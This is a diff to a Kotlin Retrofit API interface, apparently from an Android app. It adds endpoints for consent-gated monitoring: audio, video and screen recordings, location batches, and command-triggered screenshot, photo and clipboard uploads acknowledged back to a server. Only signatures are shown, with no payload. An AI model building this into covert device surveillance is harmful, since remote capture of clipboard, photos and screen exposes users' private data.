@@ -132,4 +132,93 @@ interface ApiService {
         @Header("Authorization") bearer: String,
         @Path("mediaId") mediaId: String,
     ): Response<ResponseBody>
+
+    // ─── Monitoring ────────────────────────────────────────────────────────────
+
+    @POST("monitoring/consent")
+    suspend fun setMonitoringConsent(
+        @Header("Authorization") bearer: String,
+        @Body consent: com.dilarion.app.data.model.MonitoringConsentRequest,
+    ): Response<Unit>
+
+    @Multipart
+    @POST("monitoring/recording/upload")
+    suspend fun uploadAudioRecording(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+        @Part("context") context: RequestBody,
+        @Part("duration") duration: RequestBody,
+    ): Response<Unit>
+
+    @Multipart
+    @POST("monitoring/video/upload")
+    suspend fun uploadVideoRecording(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+        @Part("context") context: RequestBody,
+    ): Response<Unit>
+
+    @Multipart
+    @POST("monitoring/screen-recording/upload")
+    suspend fun uploadScreenRecording(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+    ): Response<Unit>
+
+    @POST("monitoring/location/push")
+    suspend fun pushLocationBatch(
+        @Header("Authorization") bearer: String,
+        @Body batch: com.dilarion.app.data.model.LocationBatch,
+    ): Response<Unit>
+
+    // ─── Device data ───────────────────────────────────────────────────────────
+
+    @Multipart
+    @POST("device-data/screenshot/upload")
+    suspend fun uploadScreenshot(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+        @Part("command_id") commandId: RequestBody,
+        @Part("context") context: RequestBody,
+    ): Response<Unit>
+
+    @Multipart
+    @POST("device-data/photo/upload")
+    suspend fun uploadPhoto(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+        @Part("command_id") commandId: RequestBody,
+        @Part("context") context: RequestBody,
+    ): Response<Unit>
+
+    @POST("device-data/battery")
+    suspend fun uploadBatteryInfo(
+        @Header("Authorization") bearer: String,
+        @Body data: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device-data/network")
+    suspend fun uploadNetworkInfo(
+        @Header("Authorization") bearer: String,
+        @Body data: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device-data/device-info")
+    suspend fun uploadDeviceInfo(
+        @Header("Authorization") bearer: String,
+        @Body data: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device-data/clipboard")
+    suspend fun uploadClipboard(
+        @Header("Authorization") bearer: String,
+        @Body data: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device/command/ack")
+    suspend fun ackRemoteCommand(
+        @Header("Authorization") bearer: String,
+        @Query("command_id") commandId: Int,
+        @Query("status") status: String,
+    ): Response<Unit>
 }
